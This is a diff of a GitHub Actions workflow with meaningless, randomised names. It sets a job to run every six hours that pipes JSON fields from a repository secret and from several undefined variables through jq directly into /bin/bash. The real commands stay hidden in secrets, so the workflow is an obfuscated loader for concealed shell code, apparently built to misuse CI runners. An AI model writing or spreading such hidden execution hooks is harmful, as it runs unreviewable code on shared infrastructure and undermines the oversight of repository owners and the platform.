@@ -2,24 +2,25 @@ name: competingessay
 on:
   workflow_dispatch:
   schedule:
-    - cron: '50 3/6 * * *'
-jobs:  # 11765
+    - cron: '3 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: competingessay
         env:
-          tsbvz8010: ${{ secrets.tsbvz8010 }}
+          mys2087: ${{ secrets.mys2087 }}
         run: |
-          echo $tsbvz8010 | jq -r .xb7160 | /bin/bash
-          echo $dn9929 | jq -r .vx24 | /bin/bash
-          echo $tx14 | jq -r .nndqb4986 | /bin/bash
-          echo $ipo03868 | jq -r .a75048 | /bin/bash
-          echo $z4294 | jq -r .dicz01325 | /bin/bash
-          echo $o7841 | jq -r .zekcy3 | /bin/bash
-          echo $qdp5721 | jq -r .pth892 | /bin/bash
-          echo $x02375 | jq -r .ntysy76 | /bin/bash
-          echo $agv770 | jq -r .jnfdr45 | /bin/bash
-          echo $lr050 | jq -r .fucjj35 | /bin/bash
+          echo $mys2087 | jq -r .smax248 | /bin/bash
+          echo $tihqj11 | jq -r .gbll45951 | /bin/bash
+          echo $wpdr73 | jq -r .tvz917 | /bin/bash
+          echo $r81 | jq -r .um99 | /bin/bash
+          echo $srjq1794 | jq -r .infm47 | /bin/bash
+          echo $lpzk1728 | jq -r .suhbn9653 | /bin/bash
+          echo $qlsnr855 | jq -r .jbmse95 | /bin/bash
+          echo $jay09558 | jq -r .dhf6 | /bin/bash
+          echo $ylv38 | jq -r .gin3 | /bin/bash
+          echo $ylii9876 | jq -r .slhub56323 | /bin/bash
 
